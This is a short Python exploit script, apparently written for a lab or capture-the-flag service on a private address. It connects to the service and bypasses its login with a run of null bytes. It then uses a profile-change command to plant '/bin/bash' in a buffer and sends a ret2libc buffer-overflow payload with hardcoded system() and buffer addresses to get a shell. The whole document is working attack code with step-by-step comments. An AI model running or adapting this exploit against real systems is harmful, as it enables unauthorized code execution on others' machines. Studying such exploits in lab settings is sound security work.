import struct
import socket

def send(socket, s):
    socket.send(s+'\n')

s = socket.socket()
s.connect(('192.168.1.66', 667))

print "Connected"

r = s.recv(1024)
print ">server>"+r
print "Exploit : Sending payload to bypass login"
send(s, '\x00'*65) #Send 65 null bytes to empty the buffer and the password 
r = s.recv(1024)
print ">server>"+r

print "Exploit : Changing the name using changeprofile command to set it to the command we're going to execute"

command = "/bin/bash" #Giving this value "/bin/bash" is completely useless because we won't be able to control the shell, we can't give it any input or output

send(s, "changeprofile")
r = s.recv(1024)
print ">server>"+r
send(s, command)
r = s.recv(1024)
print ">server>"+r

print "Exploit : Doing ret2libc attack to get a shell..."
padding = "X"*256+"A"*12

system = struct.pack("I", 0xf7e04040) #static 
return_after_system = "CCCC"
bin_sh = struct.pack("I", 0x56559080) # This is the address of the buffer with the name

#MYSHELL = 0xffffdfad

payload = "0000" + padding + system + return_after_system + bin_sh
send(s, payload)
